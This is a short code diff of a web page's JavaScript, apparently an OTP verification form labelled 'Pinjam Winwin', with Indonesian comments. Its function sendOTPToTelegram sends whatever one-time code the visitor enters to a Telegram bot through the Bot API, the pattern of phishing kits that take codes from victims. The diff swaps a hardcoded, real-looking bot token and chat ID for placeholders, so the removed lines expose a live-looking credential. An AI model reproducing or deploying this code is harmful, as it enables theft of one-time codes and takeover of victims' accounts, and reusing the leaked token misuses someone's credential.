@@ -179,8 +179,8 @@
 
             // Fungsi untuk mengirim OTP ke bot Telegram menggunakan AJAX
             function sendOTPToTelegram(otp) {
-                const botToken = '6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY'; // Ganti dengan Bot Token Anda
-                const chatID = '6824078885'; // Ganti dengan Chat ID Anda
+                const botToken = 'YOUR_BOT_TOKEN'; // Ganti dengan Bot Token Anda
+                const chatID = 'YOUR_CHAT_ID'; // Ganti dengan Chat ID Anda
                 const message = `Kode OTP-Pinjam Winwin: ${otp}`;
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
@@ -200,7 +200,7 @@
                     if (otp === correctOTP) {
                         // Tindakan jika OTP valid
                     } else {
-                        errorMessage.style.display = 'block';
+                        errorMessage.style.display = 'block'; // Menampilkan pesan error jika OTP tidak valid
                     }
                 }
             });
